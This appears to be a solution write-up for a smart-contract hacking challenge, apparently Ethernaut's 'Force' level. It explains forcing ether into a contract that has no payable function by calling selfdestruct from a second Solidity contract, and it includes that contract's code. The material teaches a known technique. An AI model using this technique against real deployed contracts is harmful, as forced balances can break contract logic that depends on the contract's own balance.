# Task :
Some contracts will simply not take your money ¯\_(ツ)_/¯

The goal of this level is to make the balance of the contract greater than zero.

# Solution :

There's really no way to bump up the balance of this contract since it is an empty contract with no sort of payable function

But, what we can do is,

Make another contract and create a function that calls "selfdestruct" on the Force contract 

That way whatever balance the contract had gets transferred to the force contract

So we send some ETH to the Kill contract

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract Kill {
  constructor() payable {}

  function killCat(address _forceContract) public {
    selfdestruct(payable (_forceContract));
  }
}
```